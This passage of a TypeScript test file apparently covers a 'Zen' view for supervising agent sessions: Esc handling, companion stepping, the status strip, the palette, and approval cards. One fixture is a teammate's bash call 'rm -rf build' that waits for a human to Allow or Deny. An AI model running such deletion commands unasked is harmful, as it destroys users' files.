	assert.equal(gone.calls.applied.length, 0, "the turn moved on: the page is stale");
});

test("without an injected remote the dialog decides by the host: a paired device's hereOnly choices are disabled, this computer's are not (Z3R-F006)", async () => {
	for (const [host, disabled] of [["192.168.1.7", true], ["127.0.0.1", false]] as const) {
		Object.assign(globalThis, { location: { hostname: host } });
		const r = rig({ remote: null });
		r.feed(net([unit("a", "waiting", { since: 5, pending: select({ hereOnly: true }) })]));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		assert.equal(r.by((el) => el.getAttribute("role") === "radio").every((o) => o.disabled), disabled, host);
	}
});

test("Esc while an answer is on its way does nothing to the card: no cancel, no rest, and the outcome shows (UR-F002)", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
	r.button("Send answer")!.click();
	assert.equal(r.calls.posts.length, 1, "the answer is on its way");
	esc(r);
	assert.equal(r.calls.posts.length, 1, "no cancel is posted");
	assert.deepEqual(r.calls.leave, [], "one Esc is only the hint toward leaving, not a rest");
	assert.equal(r.by((el) => el.dataset.on !== undefined && el.getAttribute("class") === "zen-esc").length, 1, "the quiet line shows");
	assert.equal(r.by((el) => el.getAttribute("role") === "img").length, 0, "no pause screen");
	await r.reply({ outcome: "rejected", reason: "digest" });
	assert.ok(r.button("Maybe later"), "the card is still there with its outcome");
});

test("Esc on a secret_drop whose snapshot carries answer.cancel posts nothing: read-only stays read-only, Esc is Not now (UR-F003)", async () => {
	const r = rig();
	const p = { callId: "c3", tool: "secret_drop", why: "x", answer: { dialog: "s1", digest: "2".repeat(64), cancel: true, questions: [{ question: "Token?", header: "T", multiple: false, options: [{ title: "a" }] }] } } as unknown as Pending;
	r.feed(net([unit("a", "waiting", { since: 5, pending: p })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.button("Cancel"), undefined);
	esc(r);
	assert.deepEqual(r.calls.posts, [], "nothing is posted");
	assert.ok(r.by((el) => el.getAttribute("role") === "img").length, "Not now");
});

test("hiding the layer stops the ripples and disarms a first Esc (M29, M30)", async () => {
	let cancelled = 0, frames = 0;
	const r = rig({ ripple: { now: () => r.now(), frame: () => (frames++, () => void cancelled++), still: () => false, idle: () => false, size: () => ({ w: 100, h: 100, dpr: 1 }) } });
	r.feed(net([unit("m", "working")]));
	r.z.show();
	await r.settle();
	r.root.bubble("pointerdown", { clientX: 5, clientY: 5, pointerType: "mouse" });
	assert.ok(frames > 0, "a ripple was started");
	r.z.hide();
	assert.ok(cancelled > 0, "hide stops the ripples");
	r.z.show();
	await r.settle();
	await r.advance(100);
	esc(r);
	await r.advance(100);
	r.z.hide();
	r.z.show();
	await r.settle();
	esc(r);
	assert.deepEqual(r.calls.leave, [], "an Esc armed before hide does not pair with one after");
});

test("Esc on a card whose unit is offline is Not now: Cancel is disabled, so it is not pressed (UR2-F002, M04)", async () => {
	const r = rig({ offline: true });
	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.button("Cancel")?.disabled, true);
	esc(r);
	assert.deepEqual(r.calls.posts, [], "no cancel is posted");
	assert.ok(r.by((el) => el.getAttribute("role") === "img").length, "Not now");
});

test("Esc while a trust answer is on its way does not rest the card: the refusal shows (UR2-F001)", async () => {
	const r = rig();
	r.feed(net([], [TRUST]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Trust this time")!.click();
	assert.equal(r.calls.trust.length, 1);
	esc(r);
	assert.equal(r.by((el) => el.getAttribute("role") === "img").length, 0, "no pause screen");
	await r.reply({ outcome: "stale" });
	assert.ok(r.button("Maybe later"), "the card is still there");
});

test("Esc while an answer is on its way, after a second dialog replaced the panel, does not rest the card (UR2-F001)", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { since: 5, pending: questions() })]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.by((el) => el.getAttribute("role") === "radio")[0]!.click();
	r.button("Send answer")!.click();
	r.feed(net([unit("a", "waiting", { since: 5, pending: select({ cancel: true, dialog: "d2" }) })]));
	await r.settle();
	esc(r);
	assert.equal(r.by((el) => el.getAttribute("role") === "img").length, 0, "no pause screen");
	assert.deepEqual(r.calls.posts.length, 1, "no cancel is posted");
});

test("a card takes its size at once and its words fade in: the first drawing is the entrance, an outcome line sets data-fade, the card's question is never swapped for another (Z-D20), and nothing writes a box height", async () => {
	const r = rig();
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d1" }) })]));
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	const slot = r.by((el) => el.getAttribute("class") === "zen-answer")[0]!, out = r.by((el) => el.getAttribute("class") === "zen-out")[0]!, card = r.by((el) => el.getAttribute("class") === "zen-card")[0]!;
	assert.equal(slot.getAttribute("data-fade"), null, "the first drawing is the card's entrance");
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d1" }) })]));
	assert.equal(slot.getAttribute("data-fade"), null, "the same dialog again changes nothing");
	assert.equal(out.getAttribute("data-fade"), null);
	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d2" }) })]));
	assert.equal(slot.getAttribute("data-fade"), null, "a new dialog on the same unit does not swap what the card holds");
	assert.equal(r.by((el) => el.getAttribute("class") === "zen-card")[0], card, "the same card");
	assert.equal(out.textContent, "Already answered elsewhere", "it says the question it shows is settled");
	assert.notEqual(out.getAttribute("data-fade"), null, "and the line fades in");
	assert.equal(card.getAttribute("style"), null, "no box height is written");
	const { existsSync } = await import("node:fs");
	assert.ok(!existsSync(new URL("../gui/zensize.ts", import.meta.url)), "the card's easing is gone with its file");
});

// Z4b: stepping the companion, the palette, and the strip.
const companionKey = (r: { calls: { composers: { key: string }[] } }) => r.calls.composers.at(-1)!.key;
const three = () => net([unit("a", "working"), unit("b", "idle"), unit("c", "waiting", { since: 5, pending: undefined, mark: "working" })]);

test("[ and ] step the companion through the core's candidates (idle and towers first), wrap, open that session's log and composer, and the stream watches it; the stepped one stays when an item comes and goes", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("a", "working"), unit("b", "idle")]));
	r.z.show();
	await r.settle();
	assert.equal(companionKey(r), "t", "the tower the boss last wrote to");
	assert.equal(r.z.cycle(1), true);
	await r.settle();
	assert.equal(companionKey(r), "b", "candidates: t, b, a");
	assert.equal(r.calls.watch.at(-1), "b");
	assert.deepEqual(r.z.companion(), { key: "b", ws: "w" });
	assert.equal(r.z.cycle(1), true);
	assert.equal(r.z.cycle(1), true);
	await r.settle();
	assert.equal(r.z.companion(), undefined, "past the last: the breathing circle (Z-D16)");
	assert.equal(r.by((el) => el.getAttribute("class") === "zen-line").length, 1, "with its line");
	assert.equal(r.calls.watch.at(-1), null, "and no log streams");
	assert.equal(r.by((el) => el.getAttribute("role") === "status" && el.textContent === "Back to the breath").length, 1, "said to a reader");
	assert.equal(r.z.cycle(1), true);
	await r.settle();
	assert.equal(companionKey(r), "t", "then round to the first");
	assert.equal(r.z.cycle(-1), true);
	assert.equal(r.z.cycle(-1), true);
	await r.settle();
	assert.equal(companionKey(r), "a", "and backwards past the circle to the last");
	assert.equal(r.by((el) => el.getAttribute("role") === "status" && el.textContent === "With a").length, 1, "the new companion is said to a reader");
	r.feed(net([unit("a", "working"), unit("b", "idle"), unit("q", "waiting", { since: 5, pending: select() })]));
	await r.advance(600);
	assert.equal(r.button("Maybe later"), undefined, "an item does not take the screen: the stepped companion stays");
	assert.deepEqual(r.z.companion(), { key: "a", ws: "w" });
	r.z.key("talk");
	await r.settle();
	assert.ok(r.button("Maybe later"), "Enter takes it");
	r.button("Maybe later")!.click();
	await r.advance(3100);
	assert.deepEqual(r.z.companion(), { key: "a", ws: "w" }, "the companion the boss stepped to comes back");
	assert.equal(stored.has("sb.zen.with"), false, "nothing records a companion (Z-D16)");
});

test("] and [ skip a candidate that is not a live companion: every press lands on a new companion and never sticks (Z4B-F003)", async () => {
	// "g" is on the core's list but not live in the net, so companionOf would send it to the tower.
	const r = rig({ z4b: true, candidates: () => [{ key: "t", ws: "w" }, { key: "g", ws: "w" }, { key: "b", ws: "w" }, { key: "a", ws: "w" }] });
	r.feed(net([unit("a", "working"), unit("b", "idle")]));
	r.z.show();
	await r.settle();
	const step = async (dir: 1 | -1) => (assert.equal(r.z.cycle(dir), true), await r.settle(), r.z.companion()?.key ?? "circle");
	assert.equal(companionKey(r), "t");
	assert.deepEqual([await step(1), await step(1), await step(1), await step(1), await step(1)], ["b", "a", "circle", "t", "b"], "g is jumped over each time round, and the circle sits where the list wraps");
	assert.deepEqual([await step(-1), await step(-1), await step(-1)], ["t", "circle", "a"], "and backwards");
	assert.deepEqual(r.z.companion(), { key: "a", ws: "w" });
});

test("[ and ] do nothing (false, so the key stays the browser's) with nothing to step to, on a card, on the pause, with the terminal or the palette open, or while hidden", async () => {
	const r = rig({ z4b: true });
	assert.equal(r.z.cycle(1), false, "not shown");
	const bare = rig({ z4b: true, candidates: () => [] });
	bare.feed(net([unit("a", "working")]));
	bare.z.show();
	await bare.settle();
	assert.equal(bare.z.cycle(1), true, "no candidates: the companion steps to the circle");
	await bare.settle();
	assert.equal(bare.z.cycle(1), false, "and from the circle there is nothing to step to");
	r.feed(net([unit("a", "working")]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.z.cycle(1), true);
	r.z.palette();
	assert.equal(r.z.cycle(1), false, "the palette is open");
	r.z.palette();
	const none = rig();
	none.feed(net([unit("a", "working")]));
	none.z.show();
	await none.settle();
	none.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await none.settle();
	assert.equal(none.z.cycle(1), false, "no candidates given to the layer");
	const card = rig({ z4b: true });
	card.feed(net([unit("a", "waiting", { since: 5, pending: select() }), unit("b", "idle")]));
	card.z.show();
	await card.settle();
	card.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await card.settle();
	assert.equal(card.z.cycle(1), false, "an item is on the screen");
	card.button("Maybe later")!.click();
	assert.equal(card.z.cycle(1), false, "so is the pause");
});

test("hiding Zen forgets the stepped companion: coming back starts the visit again", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("a", "working"), unit("b", "idle")]));
	r.z.show();
	await r.settle();
	r.z.cycle(1);
	await r.settle();
	assert.equal(r.z.companion()?.key, "b");
	r.z.hide();
	r.z.show();
	await r.settle();
	assert.equal(r.z.companion()?.key, "t");
});

test("a visit starts at the breathing circle (Z-D16): the page names no start, a session written to before does not come back, and neither does one written to from Zen", async () => {
	stored.set("sb.zen.with", JSON.stringify({ key: "a", ws: "w", at: 1 })); // what 0.54 left in a device's storage
	const r = rig({ z4b: true, start: null });
	r.feed(net([unit("a", "working"), unit("b", "idle")]));
	r.z.show();
	await r.settle();
	assert.equal(r.z.companion(), undefined, "the circle, not the last session written to");
	assert.equal(r.calls.composers.length, 0);
	r.z.cycle(1);
	await r.settle();
	const key = r.z.companion()!.key;
	const sent = (r.calls.composers.at(-1)!.post as unknown as (a: string, b: object) => Promise<Answer>)("input", { text: "hi" });
	await r.reply({});
	assert.equal((await sent).ok, true, "the message went");
	r.z.hide();
	r.z.show();
	await r.settle();
	assert.equal(r.z.companion(), undefined, `coming back after talking to ${key}: the circle again`);
	stored.delete("sb.zen.with");
});

test("the palette's Back to the breath leaves the companion for the circle for the rest of the visit: an item that comes and goes returns to the circle", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("a", "working"), unit("b", "idle")]));
	r.z.show();
	await r.settle();
	assert.equal(companionKey(r), "t");
	r.z.palette();
	r.by((el) => el.getAttribute("role") === "option" && el.textContent.startsWith("Back to the breath"))[0]!.click();
	await r.settle();
	assert.equal(r.z.companion(), undefined, "the circle");
	assert.equal(r.calls.watch.at(-1), null);
	assert.equal(r.by((el) => el.getAttribute("role") === "status" && el.textContent === "Back to the breath").length, 1);
	r.feed(net([unit("a", "working"), unit("b", "idle"), unit("q", "waiting", { since: 5, pending: select() })]));
	await r.advance(600);
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "on the circle the item waits for Enter (Z-D19)");
	assert.equal(r.z.key("talk"), true);
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1, "Enter takes it");
	r.button("Maybe later")!.click();
	await r.advance(3100);
	assert.equal(r.z.companion(), undefined, "the circle comes back, not the companion the visit started with");
	r.z.palette();
	assert.equal(r.by((el) => el.getAttribute("role") === "option" && el.textContent.startsWith("Back to the breath")).length, 0, "the circle offers no way back to itself");
});

test("a companion that is not on the core's list steps to the list's first with ] and its last with [, never to the circle first (ZVLR-F002)", async () => {
	for (const [dir, want] of [[1, "a"], [-1, "b"]] as const) {
		const r = rig({ z4b: true, candidates: () => [{ key: "a", ws: "w" }, { key: "b", ws: "w" }] }); // the visit starts on the tower t, which the list leaves out
		r.feed(net([unit("a", "working"), unit("b", "idle")]));
		r.z.show();
		await r.settle();
		assert.equal(companionKey(r), "t");
		assert.equal(r.z.cycle(dir), true);
		await r.settle();
		assert.equal(r.z.companion()?.key, want);
	}
});

test("with one candidate that is the companion itself, the palette still offers Previous and Next, the way to the circle (ZVLR-F002)", async () => {
	const r = rig({ z4b: true, candidates: () => [{ key: "t", ws: "w" }] });
	r.feed(net([unit("a", "working")]));
	r.z.show();
	await r.settle();
	r.z.palette();
	r.by((el) => el.getAttribute("role") === "option" && el.textContent.startsWith("Next companion"))[0]!.click();
	await r.settle();
	assert.equal(r.z.companion(), undefined, "the circle");
});

test("a step or Back to the breath from the companion's composer leaves the focus on the corner menu, not the body (ZVLR-F004)", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("a", "working"), unit("b", "idle")]));
	r.z.show();
	await r.settle();
	const menu = r.by((el) => el.getAttribute("class") === "zen-menubtn")[0]!;
	r.calls.composers.at(-1)!.box.focus();
	r.z.palette();
	r.by((el) => el.getAttribute("role") === "option" && el.textContent.startsWith("Back to the breath"))[0]!.click();
	await r.settle();
	assert.equal(page.focused, menu, "the palette's way back");
	r.z.cycle(1);
	await r.settle();
	r.calls.composers.at(-1)!.box.focus();
	r.z.cycle(1);
	await r.settle();
	assert.equal(page.focused, menu, "a ] from the composer");
	menu.blur();
	r.z.cycle(1);
	await r.settle();
	assert.equal(page.focused, undefined, "a ] with the focus on the body leaves it there");
});

test("the strip says how many units work and how many are idle, from the core's selector, on the companion and the pause, not on a card; it is the same with one, two, and five waiting", async () => {
	const shots: string[] = [];
	for (const count of [1, 2, 5]) {
		const r = rig({ z4b: true });
		const waiting = Array.from({ length: count }, (_, i) => unit(`w${i}`, "waiting", { since: 5 + i, pending: select() }));
		const strip = () => r.by((el) => el.getAttribute("class") === "zen-strip")[0]!;
		r.feed(net([unit("a", "working"), unit("b", "working"), unit("i", "idle")]));
		r.z.show();
		await r.settle();
		r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
		await r.settle();
		assert.equal(strip().textContent, "Working 2 · Idle 2", "the tower is idle too");
		assert.equal(strip().hidden, false);
		r.feed(net([unit("a", "working"), unit("b", "working"), unit("i", "idle"), ...waiting]));
		await r.settle();
		assert.equal(strip().hidden, false, "the cards wait for Enter: the companion's screen stays");
		r.z.key("talk");
		await r.settle();
		assert.equal(strip().hidden, true, "a card is on the screen: no strip under it");
		r.button("Maybe later")!.click();
		await r.settle();
		assert.equal(strip().hidden, false, "the pause");
		shots.push(strip().textContent);
		assert.ok(!/wait|queue|more/i.test(strip().dump()), "no word about what waits");
	}
	assert.deepEqual(shots, ["Working 2 · Idle 2", "Working 2 · Idle 2", "Working 2 · Idle 2"]);
});

test("task 7 of the train workers: the strip adds the live trains and how many wait, as two numbers, and nothing else of them; no train, no words", async () => {
	const train = (code: string, waits: boolean) => ({ code, state: "live" as const, cars: [], steps: [{ id: 1, kind: "merge" as const, name: "merge", status: "in_progress" as const, round: 1, waits: waits ? [{ load: { max: 30, now: 42 } }] : [] }] });
	const yards = { projects: [{ project: "acme", forming: [], waiting: [], trains: [train("2026-11-08-a", true), train("2026-11-08-b", false), { ...train("2026-11-08-c", false), state: "stale" as const }] }] };
	const r = rig({ z4b: true, trains: true });
	const strip = () => r.by((el) => el.getAttribute("class") === "zen-strip")[0]!;
	r.feed({ ...net([unit("a", "working"), unit("i", "idle")]), yards });
	r.z.show();
	await r.settle();
	r.z.key("talk");
	await r.settle();
	assert.equal(strip().textContent, "Working 1 · Idle 2 · Trains 2 (1 waiting)", "V-F011: the waiting trains are a parenthesis of the trains, never a count of its own beside Idle");
	assert.equal(strip().textContent, `${m.zen_strip({ working: 1, idle: 2 })} · ${m.zen_strip_trains_waiting({ count: 2, waiting: 1 })}`);
	assert.ok(!/ready|step|merge|2026|acme|load/i.test(strip().textContent), "counts only (D9): no project, step, code or load");
	r.feed(net([unit("a", "working"), unit("i", "idle")]));
	await r.settle();
	assert.equal(strip().textContent, "Working 1 · Idle 2", "no yards: the strip is as before");
	r.feed({ ...net([unit("e", "error")], [], false), yards });
	await r.settle();
	assert.equal(strip().hidden, false, "trains alone are enough for the strip");
	assert.equal(strip().textContent, m.zen_strip_trains_waiting({ count: 2, waiting: 1 }));
	r.feed({ ...net([unit("e", "error")], [], false), yards: { projects: [{ ...yards.projects[0]!, trains: [train("2026-11-08-b", false), train("2026-11-08-d", false)] }] } });
	await r.settle();
	assert.equal(strip().textContent, "Trains 2", "none waits: no parenthesis of nothing");
});

test("the strip is hidden when no unit works or idles, and the layer without the selector draws none", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("e", "error")], [], false));
	r.z.show();
	await r.settle();
	assert.equal(r.by((el) => el.getAttribute("class") === "zen-strip")[0]!.hidden, true);
	const bare = rig();
	bare.feed(net([unit("a", "working")]));
	bare.z.show();
	await bare.settle();
	assert.equal(bare.by((el) => el.getAttribute("class") === "zen-strip")[0]!.hidden, true);
});

test("the palette opens over Zen with the page's actions and the menu's preferences, makes the page behind inert, and an item that arrives does not take the focus from its box", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("a", "working"), unit("b", "idle")]));
	r.z.show();
	await r.settle();
	assert.equal(r.z.palette(), true);
	const palette = r.by((el) => el.getAttribute("role") === "dialog")[0]!, box = r.by((el) => el.getAttribute("role") === "combobox")[0]!;
	assert.equal(page.focused, box);
	const labels = r.by((el) => el.getAttribute("role") === "option").map((o) => o.textContent);
	for (const want of ["Open tower's session", "Open tower's terminal", "Previous companion", "Next companion", "Settings", "Leave Zen (Esc Esc)", "Sound effects", "Sound effects volume up", "Background sound", "Background volume up"]) assert.ok(labels.some((l) => l.startsWith(want)), want);
	assert.ok(r.by((el) => el.getAttribute("class") === "zen-stage")[0]!.getAttribute("inert") !== null, "the stage is inert");
	assert.equal(palette.hidden, false);
	r.feed(net([unit("a", "working"), unit("q", "waiting", { since: 5, pending: select() })]));
	await r.advance(600);
	assert.equal(page.focused, box, "the item takes the screen but not the focus");
	assert.equal(r.z.palette(), true, "the key again closes it");
	assert.equal(palette.hidden, true);
	assert.equal(r.by((el) => el.getAttribute("class") === "zen-stage")[0]!.getAttribute("inert"), null);
});

test("palette entries act through the page: settings, Leave Zen (the way out), the companion's session (the same exit as Esc Esc), and its terminal", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("a", "working")]));
	r.z.show();
	await r.settle();
	const pick = (label: string) => (r.z.palette(), r.by((el) => el.getAttribute("role") === "option" && el.textContent.startsWith(label))[0]!.click());
	pick("Settings");
	assert.equal(r.calls.settings, 1);
	pick("Leave Zen (Esc Esc)");
	pick("Open tower's session");
	assert.deepEqual(r.calls.leave, [{}, { route: { view: "session", ws: "w", key: "t" } }]);
	pick("Open tower's terminal");
	assert.deepEqual(r.calls.embeds.length >= 0, true);
	assert.equal(r.by((el) => el.getAttribute("role") === "dialog")[0]!.hidden, true, "a pick closed the palette");
});

test("Esc closes the palette first and does nothing else; it is the layer's key while the palette is open, a field with text included", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("a", "working")]));
	r.z.show();
	await r.settle();
	r.z.palette();
	const box = r.by((el) => el.getAttribute("role") === "combobox")[0]!;
	box.type("vol");
	const e = esc(r);
	assert.equal(e.took, true);
	assert.equal(r.by((el) => el.getAttribute("role") === "dialog")[0]!.hidden, true);
	assert.deepEqual(r.calls.leave, []);
	assert.equal(r.by((el) => el.getAttribute("class") === "zen-esc")[0]!.textContent, "", "and no hint of leaving");
});

test("the palette key does nothing in a hidden layer or over the terminal layer", async () => {
	const r = rig({ z4b: true });
	assert.equal(r.z.palette(), false, "not shown");
	r.feed(net([unit("a", "working")]));
	r.z.show();
	await r.settle();
	r.z.terminal({ key: "a" } as never);
	await r.settle();
	assert.equal(r.z.palette(), false, "the terminal has the keyboard");
});

test("[ and ] never land on a unit that waits, a rested 'maybe later' one too", async () => {
	const r = rig({ z4b: true });
	r.feed(net([unit("a", "idle")]));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.feed(net([unit("a", "idle"), unit("q", "waiting", { since: 5, pending: select() })]));
	await r.advance(600);
	r.z.key("talk");
	await r.settle();
	r.button("Maybe later")!.click();
	await r.advance(3100);
	const seen = new Set<string>();
	for (let i = 0; i < 4; i++) {
		r.z.cycle(1);
		await r.settle();
		seen.add(r.z.companion()?.key ?? "circle");
	}
	assert.deepEqual([...seen].sort(), ["a", "circle", "t"], "the tower, a, and the circle; q waits");
});

// --- cards beyond a unit's dialog (docs/specs/2026-11-01-zen-view.md, Link cards): a teammate's tower waiting on Allow, a dialog an unattended device forwarded, a pair request, a memory proposal ------------------------------------

const CONFIRM = { dialogId: "dc1", team: "t1", from: "dev-b", fromLabel: "Mei's Mac", fromShort: "b1c2", digest: "e".repeat(64), tool: "bash", args: "rm -rf build", tower: "sb-tower-w", at: 1_000_000 - 60_000 };
const FWD = (o: Record<string, string | number> = {}) => ({ id: "dlg-1", kind: "dialog" as const, level: "warning" as const, team: "t1", teamName: "Harbor team", data: { device: "dev-b", dialogId: "dd1", digest: "f".repeat(64), dialog: JSON.stringify({ select: { title: "Deploy where?", choices: [{ label: "Staging" }, { label: "Production" }] } }), label: "Mei's Mac", short: "b1c2", owner: "ops-main", ...o } });
const PROPOSAL = { id: "P1", op: "add" as const, kind: "standing" as const, text: "Never deploy on Fridays", cites: "no deploys before the holiday" };
const PAIR = { id: "ab12cd34ef56", label: "Mei's iPhone", peer: "192.168.1.20", iface: "en0", age: "20 s", ageMs: 20_000 };
const linkNet = (o: { confirms?: unknown[]; alerts?: ReturnType<typeof FWD>[]; proposals?: unknown[]; rev?: number } = {}) => {
	const n = net([]);
	n.link = { allies: [], units: [], alerts: o.alerts ?? [], confirms: o.confirms ?? [] } as never;
	n.bases[0]!.tower!.service = { state: "standing", queued: 0, allyRuns: [], notices: [], parked: [], memory: { rev: o.rev ?? 7, standing: 0, decisions: 0, waits: 0, bossWaits: [], proposals: o.proposals ?? [] } } as never;
	return n;
};
/** The page's own `post`: every request recorded, answered by `reply` (the server's words for the route). */
const server = (reply: (path: string, body: Record<string, unknown>) => { status: number; body: unknown } = () => ({ status: 200, body: {} })) => {
	const sent: { path: string; body: Record<string, unknown> }[] = [];
	Object.assign(globalThis, { document: Object.assign(page, {}) });
	Object.assign(globalThis, { fetch: async (path: string, init: { body: string }) => { const body = JSON.parse(init.body); sent.push({ path, body }); const r = reply(path, body); return { ok: r.status < 400, status: r.status, json: async () => r.body }; } });
	return sent;
};
const noCard = (r: ReturnType<typeof rig>) => assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0);

test("a confirm a teammate's tower asked is a card: who, the sentence, the tool's arguments, Allow, Deny and Maybe later; Allow posts what Standard's row posts, and the accepted answer is the knock and the circle", async () => {
	const sent = server();
	const r = rig();
	r.feed(linkNet({ confirms: [CONFIRM] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	const card = r.by((el) => el.classes.has("zen-card"))[0]!;
	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "Mei's Mac asks you");
	assert.ok(card.textContent.includes("confirm a bash call") && card.textContent.includes("sb-tower-w"), "the sentence of the Link notice");
	assert.ok(card.textContent.includes("rm -rf build"), "the full arguments");
	for (const label of ["Allow", "Deny", "Maybe later"]) assert.ok(r.button(label), label);
	assert.equal(r.by((el) => el.getAttribute("aria-live") === "polite")[0]!.textContent, "Mei's Mac wants to ask you");
	assert.equal(page.focused, r.button("Allow"), "the focus is on Allow, the primary control: Enter presses it (Z-D20)");
	r.button("Allow")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ path: "api/link/confirm-answer", body: { dialogId: "dc1", digest: "e".repeat(64), allow: true } }]);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	assert.ok(r.text().includes("Answered."), "the card says so");
	assert.ok(r.button("Allow")!.disabled && r.button("Deny")!.disabled, "answered: no second answer from this card");
	r.feed(linkNet({ confirms: [CONFIRM] })); // the server has not dropped it yet
	await r.advance(1300);
	await r.advance(1500);
	assert.equal(r.by((el) => el.classes.has("zen-circle")).length >= 1, true, "the circle");
	noCard(r);
	await r.advance(20_000);
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 0, "still listed, but put aside for a while");
	r.feed(linkNet());
	await r.advance(20_000);
	noCard(r);
});

test("Deny posts allow false; a refusal is the low bowl and the server's reason under the card, the buttons come back, and the card stays", async () => {
	const sent = server(() => ({ status: 409, body: { error: "link_failed", reason: "That request is gone or has timed out" } }));
	const r = rig();
	r.feed(linkNet({ confirms: [CONFIRM] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.button("Deny")!.click();
	await r.settle();
	assert.deepEqual(sent.map((s) => s.body), [{ dialogId: "dc1", digest: "e".repeat(64), allow: false }]);
	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
	assert.ok(r.text().includes("That request is gone or has timed out"));
	assert.equal(r.button("Allow")!.disabled, false);
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1);
});

test("the card answers only while the stream is live", async () => {
	server();
	const r = rig({ offline: true });
	r.feed(linkNet({ confirms: [CONFIRM] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.ok(r.button("Allow")!.disabled && r.button("Deny")!.disabled);
	assert.equal(r.button("Maybe later")!.disabled, false);
});

test("a confirm the server stops listing is settled elsewhere: the knock and the line, then the circle; Maybe later puts it aside without a request", async () => {
	const sent = server();
	const r = rig();
	r.feed(linkNet({ confirms: [CONFIRM] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	r.feed(linkNet());
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	assert.ok(r.text().includes("Already answered elsewhere"));
	const r2 = rig();
	r2.feed(linkNet({ confirms: [CONFIRM] }));
	r2.z.show();
	await r2.settle();
	r2.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r2.settle();
	r2.button("Maybe later")!.click();
	await r2.advance(4000);
	noCard(r2);
	assert.deepEqual(sent, [], "no request for a rest");
});

test("Esc on a confirm card is Maybe later, never an answer and never a leave", async () => {
	const sent = server();
	const r = rig();
	r.feed(linkNet({ confirms: [CONFIRM] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-card")).length, 1);
	r.z.escape({ preventDefault() {} });
	await r.advance(4000);
	noCard(r);
	assert.deepEqual([sent, r.calls.leave], [[], []]);
});

test("a dialog an unattended device forwarded is the shared question panel; its answer goes to dialog-answer with the device, dialog and digest, and the knock follows; one answered or closed is no card", async () => {
	const sent = server();
	const r = rig();
	r.feed(linkNet({ alerts: [FWD()] }));
	r.z.show();
	await r.settle();
	r.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await r.settle();
	assert.equal(r.by((el) => el.classes.has("zen-who"))[0]!.textContent, "Mei's Mac asks you");
	assert.ok(r.text().includes("asks a question (ops-main)"));
	for (const label of ["Send answer", "Maybe later"]) assert.ok(r.button(label), label);
	r.by((el) => el.getAttribute("role") === "radio")[1]!.click();
	r.button("Send answer")!.click();
	await r.settle();
	assert.deepEqual(sent, [{ path: "api/link/dialog-answer", body: { device: "dev-b", dialogId: "dd1", digest: "f".repeat(64), answer: { choice: 1 } } }]);
	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
	const closed = rig();
	closed.feed(linkNet({ alerts: [FWD({ closed: "local" })] }));
	closed.z.show();
	await closed.settle();
	closed.z.key("talk"); // the boss takes the card: none takes the screen by itself (Z-D20)
	await closed.settle();
	noCard(closed);
});

/** A question the box forwarded exactly as a controller's snapshot carries it (tests/server-link-dialogs.test.ts reads this alert from a real server): an `ask_user_question` questionnaire with its Cancel, told as the unit that asked. */
const BOX_QUESTIONS = [{ question: "Which env?", header: "Env", multiple: false, options: [{ title: "staging" }, { title: "production" }] }];
